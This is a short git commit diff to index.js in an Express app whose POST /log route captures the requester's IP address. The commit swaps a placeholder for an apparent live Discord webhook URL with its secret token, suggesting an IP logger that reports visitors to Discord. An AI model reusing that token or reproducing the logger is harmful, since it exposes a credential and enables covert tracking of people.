c0ac508c361e8090c0eb42e4fe32f148666e122a
Ꮆ𝖗𝖎𝖋𝖋𝖎𝖙𝖍 <sethiaryan509@gmail.com>
2026-06-01 14:41:53 +0530

    Update index.js

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
-const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL"; // PASTE YOUR DISCORD LINK HERE
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1510928997561667624/yAojWif91KSBJmE6WCM5KWTRYOrSVTTzJbmQvXFJWI9zTXz5wkJBzK9wiEllntA0XXd1"; // PASTE YOUR DISCORD LINK HERE
 
 app.post('/log', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
